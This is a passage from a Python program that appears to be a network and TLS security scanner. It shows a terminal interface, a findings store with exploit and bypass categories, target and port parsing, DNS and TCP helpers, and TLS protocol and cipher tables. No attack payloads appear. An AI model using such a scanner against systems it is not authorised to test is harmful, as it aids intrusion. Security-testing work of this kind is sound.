#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os, sys, time, signal, shutil, threading, queue, re, json, math, struct, socket, ssl, random, string, hashlib, hmac, base64, binascii, ipaddress, statistics, itertools, functools, uuid, textwrap, subprocess, tempfile, csv, io, traceback, argparse, atexit, platform, errno, zlib, gzip, datetime as _dtmod, queue as _q
from collections import OrderedDict, defaultdict, namedtuple, deque
from collections import Counter as _StdCounter
from dataclasses import dataclass, field, asdict
from datetime import datetime, timezone, timedelta
from typing import Any, Callable, Optional, List, Dict, Tuple, Iterable, Set, Union
from urllib.parse import quote
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    from Crypto.Cipher import AES, DES, DES3, ARC4, ChaCha20, PKCS1_v1_5, PKCS1_OAEP
    from Crypto.PublicKey import RSA, ECC, DSA
    from Crypto.Hash import SHA1, SHA224, SHA256, SHA384, SHA512, MD5, SHA3_256, SHA3_512, HMAC as HASHHMAC
    from Crypto.Signature import pkcs1_15, DSS, pss
    from Crypto.Util.number import long_to_bytes, bytes_to_long, GCD, inverse, getPrime, isPrime
    from Crypto.Util.Padding import pad as _pad, unpad as _unpad
    from Crypto.Random import get_random_bytes
    from Crypto.Protocol.KDF import PBKDF2, scrypt, HKDF
    _HAS_CRYPTO = True
except ImportError:
    _HAS_CRYPTO = False

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
    _HAS_REQUESTS = True
except ImportError:
    requests = None
    _HAS_REQUESTS = False

try:
    import dns.resolver
    import dns.exception
    import dns.rdatatype
    import dns.name
    import dns.zone
    import dns.query
    _HAS_DNS = True
except ImportError:
    dns = None
    _HAS_DNS = False

try:
    import colorama
    colorama.init(autoreset=False)
    _HAS_COLORAMA = True
except ImportError:
    colorama = None
    _HAS_COLORAMA = False

if os.name == "posix":
    import termios, tty, select, fcntl
    _POSIX = True
else:
    termios = tty = select = fcntl = None
    _POSIX = False
    try:
        import msvcrt
    except ImportError:
        msvcrt = None

ESC = "\033"
CSI = ESC + "["
ALT_ON = CSI + "?1049h"
ALT_OFF = CSI + "?1049l"
CUR_HIDE = CSI + "?25l"
CUR_SHOW = CSI + "?25h"
CUR_HOME = CSI + "H"
CLR_SCR = CSI + "2J"
CLR_EOL = CSI + "K"
CLR_LINE = CSI + "2K"
CLEAR = CLR_SCR


class A:
    RESET = CSI + "0m"
    BOLD = CSI + "1m"
    DIM = CSI + "2m"
    FG_K = CSI + "30m"
    FG_R = CSI + "31m"
    FG_G = CSI + "32m"
    FG_Y = CSI + "33m"
    FG_B = CSI + "34m"
    FG_M = CSI + "35m"
    FG_C = CSI + "36m"
    FG_W = CSI + "37m"
    FG_GRAY = CSI + "90m"
    FG_BR_R = CSI + "91m"
    FG_BR_G = CSI + "92m"
    FG_BR_Y = CSI + "93m"
    FG_BR_B = CSI + "94m"
    FG_BR_M = CSI + "95m"
    FG_BR_C = CSI + "96m"
    FG_BR_W = CSI + "97m"
    BG_K = CSI + "40m"
    BG_R = CSI + "41m"
    BG_BR_R = CSI + "101m"
    BG_BR_G = CSI + "102m"
    BG_BR_Y = CSI + "103m"
    BG_BR_M = CSI + "105m"
    BG_BR_C = CSI + "106m"
    BG_BR_W = CSI + "107m"


BRAND = A.FG_BR_C + A.BOLD
ACCENT = A.FG_BR_M + A.BOLD
OK = A.FG_BR_G + A.BOLD
OK2 = A.FG_G
WARN = A.FG_BR_Y + A.BOLD
WARN2 = A.FG_Y
DANGER = A.FG_BR_R + A.BOLD
DANGER2 = A.FG_R
CRIT2 = A.BG_BR_R + A.FG_BR_W + A.BOLD
MUTED = A.FG_GRAY
MUTED2 = A.FG_GRAY + A.DIM
LABEL = A.FG_C
LABEL2 = A.FG_BR_C
VALUE = A.FG_BR_W + A.BOLD
VALUE2 = A.FG_W
TRACE = A.FG_B + A.DIM
VULN = A.FG_BR_Y + A.BOLD
BYPASS = A.FG_BR_M + A.BOLD
EXPLOIT = A.FG_BR_R + A.BOLD
RULE = A.FG_C + A.DIM
TIME = A.FG_B + A.BOLD
INFO = A.FG_BR_B + A.BOLD

ANSI_RE = re.compile(r"\x1b\[[0-9;]*[A-Za-z]")
OSC_RE = re.compile(r"\x1b\][^\x07]*\x07")


def strip_ansi(s):
    return ANSI_RE.sub("", OSC_RE.sub("", s))


def vlen(s):
    return len(strip_ansi(s))


def vpad(s, width, align="left", fill=" "):
    n = vlen(s)
    if n >= width:
        return s
    p = width - n
    if align == "right":
        return fill * p + s
    if align == "center":
        l = p // 2
        return fill * l + s + fill * (p - l)
    return s + fill * p


def vtrunc(s, width, ellipsis="…"):
    if vlen(s) <= width:
        return s
    out = []
    n = 0
    i = 0
    cap = width - vlen(ellipsis)
    while i < len(s) and n < cap:
        if s[i] == "\033":
            m = ANSI_RE.match(s, i) or OSC_RE.match(s, i)
            if m:
                out.append(m.group(0))
                i = m.end()
                continue
        out.append(s[i])
        n += 1
        i += 1
    out.append(A.RESET)
    out.append(ellipsis)
    return "".join(out)


def vwrap(text, width, indent=""):
    if width <= 0:
        return [text]
    words = text.split(" ")
    lines = []
    cur = ""
    cur_w = 0
    ind_w = vlen(indent)
    for wd in words:
        wl = vlen(wd)
        if cur_w == 0:
            cur = wd
            cur_w = wl
        elif cur_w + 1 + wl <= width - ind_w:
            cur += " " + wd
            cur_w += 1 + wl
        else:
            lines.append(indent + cur)
            cur = wd
            cur_w = wl
    if cur:
        lines.append(indent + cur)
    return lines if lines else [indent]


class _Cursor:
    def __init__(self):
        self.lock = threading.RLock()

    def write(self, s):
        with self.lock:
            try:
                sys.stdout.write(s)
                sys.stdout.flush()
            except Exception:
                pass


CUR = _Cursor()


def term_size(default=(100, 30)):
    try:
        s = shutil.get_terminal_size(default)
        return s.columns, s.lines
    except Exception:
        return default


def is_tty():
    try:
        return sys.stdout.isatty() and sys.stdin.isatty()
    except Exception:
        return False


def now_iso():
    return datetime.now(timezone.utc).isoformat()


def human_bytes(n):
    for unit in ("B", "KB", "MB", "GB", "TB"):
        if abs(n) < 1024.0:
            return "%.1f%s" % (n, unit)
        n /= 1024.0
    return "%.1fPB" % n


def human_dur(seconds):
    seconds = int(seconds)
    h = seconds // 3600
    m = (seconds % 3600) // 60
    s = seconds % 60
    if h:
        return "%dh%02dm%02ds" % (h, m, s)
    if m:
        return "%dm%02ds" % (m, s)
    return "%ds" % s


def hex_dump(data, width=16, max_rows=8, indent="    "):
    out = []
    if not data:
        return out
    rows = min(max_rows, (len(data) + width - 1) // width)
    for r in range(rows):
        chunk = data[r * width:(r + 1) * width]
        hx = " ".join("%02x" % b for b in chunk)
        asc = "".join(chr(b) if 32 <= b < 127 else "." for b in chunk)
        out.append(indent + MUTED + "%04x  " % (r * width) + A.RESET + TRACE +
                   vpad(hx, width * 3 - 1) + A.RESET + "  " + MUTED + asc + A.RESET)
    if len(data) > rows * width:
        out.append(indent + MUTED + "… (%d more bytes)" % (len(data) - rows * width) + A.RESET)
    return out


def safe_ascii(b, maxlen=120):
    try:
        s = b[:maxlen].decode("utf-8", "replace")
    except Exception:
        s = repr(b[:maxlen])
    return "".join(c if (c.isprintable() or c in "\r\n\t") else "." for c in s)


@dataclass
class KBEntry:
    key: str
    value: Any
    stage: str = ""
    test: str = ""
    ts: float = field(default_factory=time.time)


class KnowledgeBase:
    def __init__(self):
        self._lock = threading.RLock()
        self._data = OrderedDict()
        self._timeline = []

    def set(self, key, value, stage="", test=""):
        with self._lock:
            self._data[key] = KBEntry(key, value, stage, test)
            if value is True and (key.startswith("vulnerability.") or
                                   key.startswith("exploit.") or
                                   key.startswith("bypass.")):
                self._timeline.append({"t": now_iso(), "stage": stage, "label": key,
                                        "category": key.split(".", 1)[0],
                                        "detail": str(value)})

    def get(self, key, default=None):
        with self._lock:
            e = self._data.get(key)
            return e.value if e else default

    def keys(self):
        with self._lock:
            return list(self._data.keys())

    def items(self):
        with self._lock:
            return [(k, v.value) for k, v in self._data.items()]

    def prefix_entries(self, p):
        with self._lock:
            return [v for k, v in self._data.items() if k.startswith(p)]


KB = KnowledgeBase()


class _AtomicCounter:
    def __init__(self):
        self._lock = threading.RLock()
        self._v = defaultdict(int)

    def inc(self, key, n=1):
        with self._lock:
            self._v[key] += n
            return self._v[key]

    def get(self, key, default=0):
        with self._lock:
            return self._v.get(key, default)

    def all(self):
        with self._lock:
            return dict(self._v)


COUNTERS = _AtomicCounter()


def count(key, n=1):
    return COUNTERS.inc(key, n)


def count_get(key, default=0):
    return COUNTERS.get(key, default)


class ScrollBuffer:
    def __init__(self, max_lines=12000):
        self.lines = []
        self.max = max_lines
        self.offset = 0
        self.lock = threading.RLock()

    def append(self, line):
        with self.lock:
            self.lines.append(line)
            if len(self.lines) > self.max:
                cut = len(self.lines) - self.max
                self.lines = self.lines[cut:]
                self.offset = max(0, self.offset - cut)

    def append_many(self, lines):
        with self.lock:
            for l in lines:
                self.lines.append(l)
            if len(self.lines) > self.max:
                cut = len(self.lines) - self.max
                self.lines = self.lines[cut:]
                self.offset = max(0, self.offset - cut)

    def scroll_up(self, n):
        with self.lock:
            self.offset = min(len(self.lines), self.offset + n)

    def scroll_down(self, n):
        with self.lock:
            self.offset = max(0, self.offset - n)

    def scroll_top(self):
        with self.lock:
            self.offset = max(0, len(self.lines) - 1)

    def scroll_bottom(self):
        with self.lock:
            self.offset = 0

    def view(self, height):
        with self.lock:
            total = len(self.lines)
            if total <= height:
                return list(self.lines)
            bottom = total - self.offset
            top = max(0, bottom - height)
            return list(self.lines[top:bottom])


class AbortFlag:
    def __init__(self):
        self._flag = threading.Event()

    def set(self):
        self._flag.set()

    def clear(self):
        self._flag.clear()

    def is_set(self):
        return self._flag.is_set()


ABORT = AbortFlag()


class Screen:
    _inst = None
    _lock = threading.RLock()

    def __new__(cls):
        with cls._lock:
            if cls._inst is None:
                cls._inst = super().__new__(cls)
                cls._inst._init()
            return cls._inst

    def _init(self):
        self.w = 100
        self.h = 30
        self.buf = ScrollBuffer()
        self.header_left = ""
        self.header_right = ""
        self.footer_left = ""
        self.footer_right = ""
        self.running = False
        self._render_lock = threading.RLock()
        self._input_q = _q.Queue()
        self._old_term = None
        self._stop = threading.Event()

    def size(self):
        return term_size()

    def start(self):
        if self.running:
            return
        if not is_tty():
            return
        self.running = True
        self._stop.clear()
        if _POSIX:
            try:
                self._old_term = termios.tcgetattr(sys.stdin.fileno())
                tty.setraw(sys.stdin.fileno())
            except Exception:
                self._old_term = None
        CUR.write(ALT_ON + CUR_HIDE + CLR_SCR + CUR_HOME)
        atexit.register(self.stop)
        threading.Thread(target=self._reader_loop, daemon=True).start()
        threading.Thread(target=self._render_loop, daemon=True).start()

    def stop(self):
        if not self.running:
            return
        self.running = False
        self._stop.set()
        try:
            CUR.write(CUR_SHOW + ALT_OFF)
        except Exception:
            pass
        if _POSIX and self._old_term is not None:
            try:
                termios.tcsetattr(sys.stdin.fileno(), termios.TCSADRAIN, self._old_term)
            except Exception:
                pass

    def _reader_loop(self):
        fd = sys.stdin.fileno() if _POSIX else None
        while not self._stop.is_set():
            try:
                if _POSIX:
                    r, _, _ = select.select([sys.stdin], [], [], 0.1)
                    if not r:
                        continue
                    data = os.read(fd, 64)
                    if not data:
                        continue
                    for b in data:
                        self._input_q.put(chr(b))
                else:
                    if msvcrt and msvcrt.kbhit():
                        ch = msvcrt.getch()
                        try:
                            ch = ch.decode("utf-8", "ignore")
                        except Exception:
                            ch = ""
                        if ch:
                            self._input_q.put(ch)
                    else:
                        time.sleep(0.05)
            except Exception:
                time.sleep(0.1)

    def _render_loop(self):
        last_size = (0, 0)
        while not self._stop.is_set():
            try:
                self._process_input()
                cur_size = self.size()
                if cur_size != last_size:
                    last_size = cur_size
                    CUR.write(CLR_SCR)
                self._render()
            except KeyboardInterrupt:
                ABORT.set()
                self._stop.set()
                return
            except BaseException:
                pass
            time.sleep(0.06)

    def _process_input(self):
        while True:
            try:
                ch = self._input_q.get_nowait()
            except _q.Empty:
                return
            if ch == "\x03":
                ABORT.set()
                self._stop.set()
                return
            if ch == "\x1b":
                time.sleep(0.02)
                seq = []
                deadline = time.time() + 0.05
                while time.time() < deadline:
                    try:
                        nxt = self._input_q.get_nowait()
                    except _q.Empty:
                        time.sleep(0.005)
                        continue
                    seq.append(nxt)
                    if len(seq) >= 8:
                        break
                    if len(seq) >= 2 and seq[-1].isalpha() and seq[-1] not in "[O":
                        break
                s = "".join(seq)
                h = max(1, self.size()[1] - 2)
                if s.startswith("[A"):
                    self.buf.scroll_up(1)
                elif s.startswith("[B"):
                    self.buf.scroll_down(1)
                elif s.startswith("[5~"):
                    self.buf.scroll_up(h)
                elif s.startswith("[6~"):
                    self.buf.scroll_down(h)
                elif s.startswith("[H") or s.startswith("[1~"):
                    self.buf.scroll_top()
                elif s.startswith("[F") or s.startswith("[4~"):
                    self.buf.scroll_bottom()
                continue
            if ch in ("q", "Q"):
                ABORT.set()
                self._stop.set()
                return
            if ch == "j":
                self.buf.scroll_down(1)
            elif ch == "k":
                self.buf.scroll_up(1)
            elif ch == "g":
                self.buf.scroll_top()
            elif ch == "G":
                self.buf.scroll_bottom()
            elif ch == " ":
                self.buf.scroll_down(max(1, self.size()[1] - 3))
            elif ch == "b":
                self.buf.scroll_up(max(1, self.size()[1] - 3))

    def _render(self):
        with self._render_lock:
            w, h = self.size()
            self.w, self.h = w, h
            if w < 60 or h < 12:
                CUR.write(CLR_SCR + CUR_HOME)
                CUR.write(WARN + "terminal too small" + A.RESET)
                return
            body_h = h - 2
            body = self.buf.view(body_h)
            out = [CUR_HOME]
            out.append(vpad(vtrunc(self.header_left, w), w) + "\r\n")
            for line in body:
                out.append(vpad(vtrunc(line, w), w) + "\r\n")
            for _ in range(body_h - len(body)):
                out.append(" " * w + "\r\n")
            out.append(vpad(vtrunc(self.footer_left, w), w))
            CUR.write("".join(out))

    def print(self, *parts, end="\n"):
        line = "".join(str(p) for p in parts)
        for sub in line.split("\n"):
            self.buf.append(sub)

    def print_many(self, lines):
        self.buf.append_many(lines)

    def set_header(self, left=None, right=None):
        if left is not None:
            self.header_left = left
        if right is not None:
            self.header_right = right

    def set_footer(self, left=None, right=None):
        if left is not None:
            self.footer_left = left
        if right is not None:
            self.footer_right = right


SCR = Screen()

PTL, PTR, PBL, PBR, PH, PV, PLT, PRT = "┌", "┐", "└", "┘", "─", "│", "├", "┤"
DTL, DTR, DBL, DBR, DH = "╔", "╗", "╚", "╝", "═"
DOTTED = "┈"
GLYPH_DOT = "·"
GLYPH_ARROW = "▸"
GLYPH_CHECK = "✔"
GLYPH_CROSS = "✘"
GLYPH_WARN = "⚠"
GLYPH_INFO = "ℹ"
GLYPH_SKIP = "○"
GLYPH_BULLET = "●"
GLYPH_STAR = "★"
GLYPH_SKULL = "☠"
GLYPH_BOLT = "⚡"
GLYPH_CYCLE = "↻"
GLYPH_CLOCK = "⏱"
GLYPH_FIRE = "🔥"
GLYPH_TARGET = "◈"
GLYPH_CTRL = "⏻"


class Panel:
    @staticmethod
    def top(width, title="", colour=BRAND):
        inner = width - 2
        if not title:
            return colour + PTL + PH * inner + PTR + A.RESET
        t = " " + title + " "
        tv = vlen(t)
        left = 1
        right = max(0, inner - tv - left)
        return (colour + PTL + PH * left + A.RESET + colour + A.BOLD + t +
                A.RESET + colour + PH * right + PTR + A.RESET)

    @staticmethod
    def bottom(width, colour=BRAND):
        return colour + PBL + PH * (width - 2) + PBR + A.RESET

    @staticmethod
    def line(content="", width=80, colour=BRAND):
        inner = width - 2
        c = vpad(vtrunc(content, inner), inner)
        return colour + PV + A.RESET + c + colour + PV + A.RESET

    @staticmethod
    def render(title, body_lines, width=80, colour=BRAND, status="",
               sc=OK, glyph=GLYPH_TARGET):
        out = []
        title_str = glyph + "  " + title
        if status:
            title_str += "  " + MUTED + DOTTED * 3 + A.RESET + " " + sc + " " + status + A.RESET
        out.append(Panel.top(width, title_str, colour=colour))
        if not body_lines:
            body_lines = [MUTED + "no output" + A.RESET]
        for ln in body_lines:
            for sub in vwrap(ln, width - 4):
                out.append(Panel.line("  " + sub, width, colour))
        out.append(Panel.bottom(width, colour))
        return out

    @staticmethod
    def banner(title, subtitle="", width=80, colour=ACCENT, glyph=GLYPH_STAR):
        inner = width - 2
        head = "  " + glyph + "  " + title
        if subtitle:
            head += "  " + MUTED + GLYPH_DOT + A.RESET + " " + subtitle
        return [colour + DTL + DH * inner + DTR + A.RESET,
                Panel.line(head, width, colour),
                colour + DBL + DH * inner + DBR + A.RESET]

    @staticmethod
    def metric(label, value, hint="", width=80, indent=4, lw=20, colour=VALUE):
        lab = " " * indent + LABEL + vpad(label, lw) + A.RESET
        sep = MUTED + PV + A.RESET
        val = colour + str(value) + A.RESET
        tail = "  " + MUTED + hint + A.RESET if hint else ""
        return lab + " " + sep + " " + val + tail

    @staticmethod
    def alert(level, message):
        cm = {"info": INFO, "ok": OK, "warn": WARN, "error": DANGER, "vuln": VULN,
              "exploit": EXPLOIT, "bypass": BYPASS, "skip": MUTED, "crit": CRIT2}
        gm = {"info": GLYPH_INFO, "ok": GLYPH_CHECK, "warn": GLYPH_WARN,
              "error": GLYPH_CROSS, "vuln": GLYPH_BOLT, "exploit": GLYPH_SKULL,
              "bypass": GLYPH_CYCLE, "skip": GLYPH_SKIP, "crit": GLYPH_FIRE}
        c = cm.get(level, INFO)
        g = gm.get(level, GLYPH_INFO)
        return "  " + c + g + A.RESET + "  " + VALUE + str(message) + A.RESET


class TestSpec:
    def __init__(self, name, title, fn, timeout=45.0):
        self.name = name
        self.title = title
        self.fn = fn
        self.timeout = timeout


class TestResult:
    def __init__(self, name, status, elapsed, lines, evidence, error=""):
        self.name = name
        self.status = status
        self.elapsed = elapsed
        self.lines = lines
        self.evidence = evidence
        self.error = error


class StageSpec:
    def __init__(self, index, name, title, description, tests, estimated_seconds=30.0):
        self.index = index
        self.name = name
        self.title = title
        self.description = description
        self.tests = tests
        self.estimated_seconds = estimated_seconds


class StageResult:
    def __init__(self, index, name, title):
        self.index = index
        self.name = name
        self.title = title
        self.tests = []
        self.started = 0.0
        self.finished = 0.0
        self.status = "pending"


def emit_kv(emit, key, value, colour=VALUE, key_w=24):
    emit("  " + LABEL + vpad(key, key_w) + A.RESET + " " + MUTED + GLYPH_DOT +
         A.RESET + " " + colour + str(value) + A.RESET)


def emit_line(emit, text, colour=VALUE):
    emit("  " + colour + text + A.RESET)


def emit_header(emit, text, colour=BRAND):
    emit(colour + A.BOLD + text + A.RESET)


def emit_alert(emit, level, text):
    emit(Panel.alert(level, text))


def emit_hex(emit, label, data, max_bytes=64, rows=4):
    emit("  " + LABEL + vpad(label, 24) + A.RESET + " " + MUTED + GLYPH_DOT +
         A.RESET + " " + VALUE2 + "%d bytes" % len(data) + A.RESET)
    for line in hex_dump(data, 16, rows):
        emit(line)


class Target:
    DEFAULT_PORTS = {
        "tcp": 443, "ssl": 443, "tls": 443, "https": 443, "h2": 443, "grpc": 443,
        "http": 80, "h2c": 80,
        "smtp": 25, "smtps": 465, "submission": 587,
        "imap": 143, "imaps": 993, "pop3": 110, "pop3s": 995,
        "ldap": 389, "ldaps": 636, "rdp": 3389, "ssh": 22,
        "ftp": 21, "ftps": 990, "dtls": 443, "quic": 443,
        "dot": 853, "doh": 443, "dns": 53,
        "mysql": 3306, "postgres": 5432, "postgresql": 5432,
        "redis": 6379, "mongo": 27017, "mongodb": 27017,
        "memcached": 11211, "elastic": 9200, "kibana": 5601,
        "kafka": 9092, "amqp": 5672, "mqtt": 1883,
        "vnc": 5900, "telnet": 23, "mssql": 1433,
    }

    def __init__(self, raw):
        self.raw = raw.strip()
        self.scheme = "tcp"
        self.host = ""
        self.port = 443
        self.path = "/"
        self.query = ""
        self._parse()

    def _parse(self):
        raw = self.raw
        if not raw:
            raise ValueError("empty target")
        if "://" not in raw:
            if raw.startswith("//"):
                raw = "tcp:" + raw
            elif raw.startswith("[") and "]:" in raw:
                raw = "tcp://" + raw
            elif ":" in raw:
                host_part, _, port_part = raw.rpartition(":")
                if port_part.isdigit():
                    raw = "tcp://" + host_part + ":" + port_part
                else:
                    raw = "tcp://" + raw
            else:
                raw = "tcp://" + raw
        scheme, _, rest = raw.partition("://")
        self.scheme = (scheme or "tcp").lower()
        self.port = self.DEFAULT_PORTS.get(self.scheme, 443)
        if "/" in rest:
            authority, _, pathq = rest.partition("/")
            self.path = "/" + pathq
        else:
            authority = rest
        if "?" in self.path:
            self.path, _, self.query = self.path.partition("?")
        if "@" in authority:
            _, _, authority = authority.rpartition("@")
        if authority.startswith("["):
            end = authority.find("]")
            self.host = authority[1:end]
            rem = authority[end + 1:]
            if rem.startswith(":") and rem[1:].isdigit():
                self.port = int(rem[1:])
        elif ":" in authority:
            h, _, p = authority.rpartition(":")
            if p.isdigit():
                self.host = h
                self.port = int(p)
            else:
                self.host = authority
        else:
            self.host = authority
        if not self.host:
            raise ValueError("no host in target: %r" % self.raw)

    def uri(self):
        return "%s://%s:%d" % (self.scheme, self.host, self.port)


class SignalGuard:
    def __init__(self):
        self._orig = {}

    def install(self):
        def handler(signum, frame):
            ABORT.set()
        try:
            self._orig[signal.SIGINT] = signal.signal(signal.SIGINT, handler)
        except Exception:
            pass

    def restore(self):
        for sig, h in self._orig.items():
            try:
                signal.signal(sig, h)
            except Exception:
                pass


def resolve_a(host, timeout=4.0):
    if _HAS_DNS:
        try:
            res = dns.resolver.Resolver()
            res.timeout = timeout
            res.lifetime = timeout
            return [str(a) for a in res.resolve(host, "A")]
        except Exception:
            pass
    try:
        infos = socket.getaddrinfo(host, None, socket.AF_INET, socket.SOCK_STREAM)
        return sorted({i[4][0] for i in infos})
    except Exception:
        return []


def resolve_aaaa(host, timeout=4.0):
    if _HAS_DNS:
        try:
            res = dns.resolver.Resolver()
            res.timeout = timeout
            res.lifetime = timeout
            return [str(a) for a in res.resolve(host, "AAAA")]
        except Exception:
            pass
    try:
        infos = socket.getaddrinfo(host, None, socket.AF_INET6, socket.SOCK_STREAM)
        return sorted({i[4][0] for i in infos})
    except Exception:
        return []


def resolve_cname(host, timeout=4.0):
    if not _HAS_DNS:
        return []
    out = []
    try:
        res = dns.resolver.Resolver()
        res.timeout = timeout
        res.lifetime = timeout
        for a in res.resolve(host, "CNAME"):
            out.append(str(a.target).rstrip("."))
    except Exception:
        pass
    return out


def connect_tcp(host, port, timeout=3.0):
    t0 = time.time()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    try:
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    except Exception:
        pass
    try:
        s.connect((host, port))
        count("connections")
        return s, time.time() - t0, ""
    except Exception as e:
        try:
            s.close()
        except Exception:
            pass
        return None, time.time() - t0, str(e)


CT_CHANGE_CIPHER_SPEC = 20
CT_ALERT = 21
CT_HANDSHAKE = 22
CT_APPLICATION_DATA = 23
CT_HEARTBEAT = 24

HS_HELLO_REQUEST = 0
HS_CLIENT_HELLO = 1
HS_SERVER_HELLO = 2
HS_NEW_SESSION_TICKET = 4
HS_END_OF_EARLY_DATA = 5
HS_ENCRYPTED_EXTENSIONS = 8
HS_CERTIFICATE = 11
HS_SERVER_KEY_EXCHANGE = 12
HS_CERTIFICATE_REQUEST = 13
HS_SERVER_HELLO_DONE = 14
HS_CERTIFICATE_VERIFY = 15
HS_CLIENT_KEY_EXCHANGE = 16
HS_FINISHED = 20
HS_CERTIFICATE_STATUS = 22
HS_SUPPLEMENTAL_DATA = 23
HS_KEY_UPDATE = 24
HS_MESSAGE_HASH = 254

EXT_SERVER_NAME = 0x0000
EXT_MAX_FRAGMENT_LENGTH = 0x0001
EXT_STATUS_REQUEST = 0x0005
EXT_SUPPORTED_GROUPS = 0x000a
EXT_EC_POINT_FORMATS = 0x000b
EXT_SIGNATURE_ALGORITHMS = 0x000d
EXT_HEARTBEAT = 0x000f
EXT_ALPN = 0x0010
EXT_SIGNED_CERT_TIMESTAMP = 0x0012
EXT_PADDING = 0x0015
EXT_EXTENDED_MASTER_SECRET = 0x0017
EXT_SESSION_TICKET = 0x0023
EXT_PRE_SHARED_KEY = 0x0029
EXT_EARLY_DATA = 0x002a
EXT_SUPPORTED_VERSIONS = 0x002b
EXT_COOKIE = 0x002c
EXT_PSK_KEY_EXCHANGE_MODES = 0x002d
EXT_POST_HANDSHAKE_AUTH = 0x0031
EXT_SIGNATURE_ALGORITHMS_CERT = 0x0032
EXT_KEY_SHARE = 0x0033
EXT_ENCRYPTED_SERVER_NAME = 0xfe0d
EXT_RENEGOTIATION_INFO = 0xff01

EXT_NAMES = {
    EXT_SERVER_NAME: "server_name",
    EXT_MAX_FRAGMENT_LENGTH: "max_fragment_length",
    EXT_STATUS_REQUEST: "status_request",
    EXT_SUPPORTED_GROUPS: "supported_groups",
    EXT_EC_POINT_FORMATS: "ec_point_formats",
    EXT_SIGNATURE_ALGORITHMS: "signature_algorithms",
    EXT_HEARTBEAT: "heartbeat",
    EXT_ALPN: "alpn",
    EXT_SIGNED_CERT_TIMESTAMP: "signed_certificate_timestamp",
    EXT_PADDING: "padding",
    EXT_EXTENDED_MASTER_SECRET: "extended_master_secret",
    EXT_SESSION_TICKET: "session_ticket",
    EXT_PRE_SHARED_KEY: "pre_shared_key",
    EXT_EARLY_DATA: "early_data",
    EXT_SUPPORTED_VERSIONS: "supported_versions",
    EXT_COOKIE: "cookie",
    EXT_PSK_KEY_EXCHANGE_MODES: "psk_key_exchange_modes",
    EXT_POST_HANDSHAKE_AUTH: "post_handshake_auth",
    EXT_SIGNATURE_ALGORITHMS_CERT: "signature_algorithms_cert",
    EXT_KEY_SHARE: "key_share",
    EXT_ENCRYPTED_SERVER_NAME: "encrypted_server_name",
    EXT_RENEGOTIATION_INFO: "renegotiation_info",
}

CIPHER_NAMES = {
    0x0000: ("TLS_NULL_WITH_NULL_NULL", 0, "NULL"),
    0x0001: ("TLS_RSA_WITH_NULL_MD5", 0, "RSA"),
    0x0002: ("TLS_RSA_WITH_NULL_SHA", 0, "RSA"),
    0x0003: ("TLS_RSA_EXPORT_WITH_RC4_40_MD5", 40, "RSA-EXPORT"),
    0x0004: ("TLS_RSA_WITH_RC4_128_MD5", 128, "RSA"),
    0x0005: ("TLS_RSA_WITH_RC4_128_SHA", 128, "RSA"),
    0x0006: ("TLS_RSA_EXPORT_WITH_RC2_CBC_40_MD5", 40, "RSA-EXPORT"),
    0x0008: ("TLS_RSA_EXPORT_WITH_DES40_CBC_SHA", 40, "RSA-EXPORT"),
    0x0009: ("TLS_RSA_WITH_DES_CBC_SHA", 56, "RSA"),
    0x000a: ("TLS_RSA_WITH_3DES_EDE_CBC_SHA", 168, "RSA"),
    0x0013: ("TLS_DHE_DSS_WITH_3DES_EDE_CBC_SHA", 168, "DHE"),
    0x0016: ("TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA", 168, "DHE"),
    0x0018: ("TLS_DH_anon_WITH_RC4_128_MD5", 128, "DH-anon"),
    0x001b: ("TLS_DH_anon_WITH_3DES_EDE_CBC_SHA", 168, "DH-anon"),
    0x002f: ("TLS_RSA_WITH_AES_128_CBC_SHA", 128, "RSA"),
    0x0033: ("TLS_DHE_RSA_WITH_AES_128_CBC_SHA", 128, "DHE"),
    0x0035: ("TLS_RSA_WITH_AES_256_CBC_SHA", 256, "RSA"),
    0x0039: ("TLS_DHE_RSA_WITH_AES_256_CBC_SHA", 256, "DHE"),
    0x003b: ("TLS_RSA_WITH_NULL_SHA256", 0, "RSA"),
    0x003c: ("TLS_RSA_WITH_AES_128_CBC_SHA256", 128, "RSA"),
    0x003d: ("TLS_RSA_WITH_AES_256_CBC_SHA256", 256, "RSA"),
    0x0067: ("TLS_DHE_RSA_WITH_AES_128_CBC_SHA256", 128, "DHE"),
    0x006b: ("TLS_DHE_RSA_WITH_AES_256_CBC_SHA256", 256, "DHE"),
    0x009c: ("TLS_RSA_WITH_AES_128_GCM_SHA256", 128, "RSA"),
    0x009d: ("TLS_RSA_WITH_AES_256_GCM_SHA384", 256, "RSA"),
    0x009e: ("TLS_DHE_RSA_WITH_AES_128_GCM_SHA256", 128, "DHE"),
    0x009f: ("TLS_DHE_RSA_WITH_AES_256_GCM_SHA384", 256, "DHE"),
    0x00ff: ("TLS_EMPTY_RENEGOTIATION_INFO_SCSV", 0, "SCSV"),
    0x1301: ("TLS_AES_128_GCM_SHA256", 128, "TLS13"),
    0x1302: ("TLS_AES_256_GCM_SHA384", 256, "TLS13"),
    0x1303: ("TLS_CHACHA20_POLY1305_SHA256", 256, "TLS13"),
    0x1304: ("TLS_AES_128_CCM_SHA256", 128, "TLS13"),
    0x1305: ("TLS_AES_128_CCM_8_SHA256", 128, "TLS13"),
    0x5600: ("TLS_FALLBACK_SCSV", 0, "SCSV"),
    0xc001: ("TLS_ECDH_ECDSA_WITH_NULL_SHA", 0, "ECDH"),
    0xc002: ("TLS_ECDH_ECDSA_WITH_RC4_128_SHA", 128, "ECDH"),
    0xc003: ("TLS_ECDH_ECDSA_WITH_3DES_EDE_CBC_SHA", 168, "ECDH"),
    0xc004: ("TLS_ECDH_ECDSA_WITH_AES_128_CBC_SHA", 128, "ECDH"),
    0xc005: ("TLS_ECDH_ECDSA_WITH_AES_256_CBC_SHA", 256, "ECDH"),
    0xc006: ("TLS_ECDHE_ECDSA_WITH_NULL_SHA", 0, "ECDHE"),
    0xc007: ("TLS_ECDHE_ECDSA_WITH_RC4_128_SHA", 128, "ECDHE"),
    0xc008: ("TLS_ECDHE_ECDSA_WITH_3DES_EDE_CBC_SHA", 168, "ECDHE"),
    0xc009: ("TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA", 128, "ECDHE"),
    0xc00a: ("TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA", 256, "ECDHE"),
